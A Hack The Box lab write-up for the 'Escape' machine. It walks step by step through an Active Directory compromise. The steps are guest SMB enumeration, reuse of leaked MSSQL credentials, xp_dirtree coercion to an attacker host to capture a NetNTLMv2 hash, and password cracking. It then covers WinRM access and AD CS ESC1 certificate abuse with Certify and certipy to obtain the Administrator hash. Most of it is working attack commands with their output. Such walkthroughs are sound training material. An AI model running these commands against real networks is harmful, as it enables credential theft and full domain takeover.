---
title: HTB Escape
slug: escape
lang: en
platform: Hack The Box
category: Active Directory
headline: MSSQL credential exposure, NetNTLMv2 coercion and AD CS ESC1
difficulty: Medium
objective: Administrator
date: 2026-05-20
tags: [Active Directory, MSSQL, NetNTLMv2, AD CS, ESC1]
---

# HTB Escape

## Executive Summary

Escape is an Active Directory machine where the initial path starts with guest-accessible SMB shares. A public document exposes MSSQL credentials, which allow access to the SQL Server service. From there, `xp_dirtree` is used to coerce outbound SMB authentication and capture a NetNTLMv2 hash for the `sql_svc` account.

After cracking the hash, WinRM access as `sql_svc` reveals SQL Server logs containing credentials for `Ryan.Cooper`. That user can request a certificate through a vulnerable AD CS template where the enrollee can supply the subject. By requesting a certificate for `administrator@sequel.htb`, it is possible to authenticate as Administrator and retrieve the NT hash.

## Port Enumeration

The initial scan showed a Windows domain controller with Kerberos, LDAP, SMB, MSSQL, WinRM, AD Web Services and Global Catalog ports exposed.

```bash
Nmap scan report for 10.129.228.253
Host is up, received user-set (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49709/tcp open  unknown
64517/tcp open  unknown
64538/tcp open  unknown
```

Service enumeration was then focused on the discovered ports.

```bash
sudo nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49709,64517,64538 -sCV -vvv -oN Targeted 10.129.228.253
```

![[Pasted image 20260514192943.png|Targeted service enumeration]]

## SMB Enumeration as Guest

Guest authentication was accepted over SMB. The `Public` share allowed read access, which became the initial foothold for credential discovery.

```bash
nxc smb 10.129.69.23 -u 'guest' -p '' --shares
```

```text
SMB  10.129.69.23  445  DC  [+] sequel.htb\guest:
SMB  10.129.69.23  445  DC  [*] Enumerated shares

Share     Permissions  Remark
-----     -----------  ------
ADMIN$                 Remote Admin
C$                     Default share
IPC$      READ         Remote IPC
NETLOGON               Logon server share
Public    READ
SYSVOL                 Logon server share
```

![[Pasted image 20260519180333.png|SMB share enumeration as guest]]

The `Public` share contained a document named `SQL Server Procedures.pdf`.

![[Pasted image 20260519180819.png|Public share with readable content]]

![[Pasted image 20260519181037.png|SQL Server Procedures document]]

Reviewing the document revealed a low-privileged MSSQL account.

```text
user: PublicUser
password: GuestUserCantWrite1
```

![[Pasted image 20260519181323.png|Credentials exposed in the SQL Server document]]

## MSSQL Access and NetNTLMv2 Capture

The exposed credentials allowed authentication to MSSQL through Impacket.

```bash
mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

```text
[*] Encryption required, switching to TLS
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
SQL (PublicUser guest@master)>
```

![[Pasted image 20260519181809.png|MSSQL login as PublicUser]]

The next step was to abuse `xp_dirtree` to force SQL Server to connect to the attacker-controlled host over SMB. This caused the service account to leak a NetNTLMv2 challenge-response to Responder.

```sql
xp_dirtree '\\10.10.17.23\test'
```

![[Pasted image 20260519183759.png|xp_dirtree available from MSSQL]]

![[Pasted image 20260519184013.png|Responder captures sql_svc NetNTLMv2]]

The captured hash was cracked with John the Ripper.

```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt SMB-NTLMv2-SSP-10.129.69.23.txt
```

```text
REGGIE1234ronnie (sql_svc)
```

![[Pasted image 20260519184549.png|Cracked sql_svc password]]

## Initial Access as sql_svc

The recovered password was valid for WinRM, providing an interactive shell as `sql_svc`.

```bash
evil-winrm -i 10.129.69.23 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![[Pasted image 20260519185002.png|WinRM access as sql_svc]]

After enumerating local users and directories, a `C:\SQLServer\logs` directory was discovered. The file `ERRORLOG.BAK` contained a useful authentication failure entry.

![[Pasted image 20260519185624.png|Local user enumeration]]

![[Pasted image 20260519185804.png|SQLServer logs directory]]

![[Pasted image 20260519190132.png|Downloaded ERRORLOG.BAK]]

The log showed a failed login attempt for `Ryan.Cooper` where the password had been entered into the username field or exposed in the log context.

```text
Ryan.Cooper / NuclearMosquito3
```

![[Pasted image 20260519190731.png|Ryan Cooper credential disclosure in SQL Server log]]

The credentials were valid for SMB and WinRM.

```bash
nxc smb 10.129.69.23 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
nxc winrm 10.129.69.23 -u 'Ryan.Cooper' -p 'NuclearMosquito3'

evil-winrm -i 10.129.69.23 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

![[Pasted image 20260519190703.png|Ryan Cooper WinRM validation]]

At this stage, the user flag was accessible.

![[Pasted image 20260519191037.png|User flag]]

## Privilege Escalation through AD CS

With valid domain credentials for `Ryan.Cooper`, AD CS was enumerated through LDAP. The domain exposed a PKI enrollment server and certificate authority.

```bash
nxc ldap 10.129.69.23 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
```

```text
Found PKI Enrollment Server: dc.sequel.htb
Found CN: sequel-DC-CA
```

![[Pasted image 20260519192221.png|AD CS discovery through LDAP]]

![[Pasted image 20260519192823.png|Certificate authority details]]

`Certify.exe` was uploaded through Evil-WinRM to identify vulnerable certificate templates from the current user's context.

```powershell
upload Certify.exe
.\Certify.exe find /vulnerable /currentuser
```

![[Pasted image 20260519193637.png|Certify upload through Evil-WinRM]]

![[Pasted image 20260519194023.png|Certify vulnerable template discovery]]

The vulnerable template allowed `ENROLLEE_SUPPLIES_SUBJECT`, meaning the requester could supply an arbitrary subject alternative name. Because low-privileged domain users could enroll, this matched an AD CS ESC1-style abuse path.

![[Pasted image 20260519194208.png|ENROLLEE_SUPPLIES_SUBJECT on vulnerable template]]

A certificate was requested for `administrator@sequel.htb` using the vulnerable template.

```bash
certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 \
  -upn administrator@sequel.htb \
  -target sequel.htb \
  -ca sequel-dc-ca \
  -template UserAuthentication
```

```text
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

![[Pasted image 20260519200842.png|Certificate request for Administrator UPN]]

The issued certificate was then used to authenticate and retrieve the Administrator NT hash.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.69.23
```

```text
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

![[Pasted image 20260520091404.png|Administrator authentication with certificate]]

The Administrator hash provided privileged access and the root flag was recovered.

![[Pasted image 20260520091634.png|Administrator shell]]

![[Pasted image 20260520091714.png|Root flag]]

## Key Takeaways

- Guest-readable SMB shares can expose operational documents with reusable credentials.
- MSSQL features such as `xp_dirtree` can be abused to coerce outbound SMB authentication and capture NetNTLMv2 material.
- SQL Server logs may disclose credentials when authentication failures are mishandled or passwords are entered in the wrong field.
- AD CS templates with enrollee-supplied subject names and broad enrollment rights can enable full domain compromise through ESC1-style abuse.
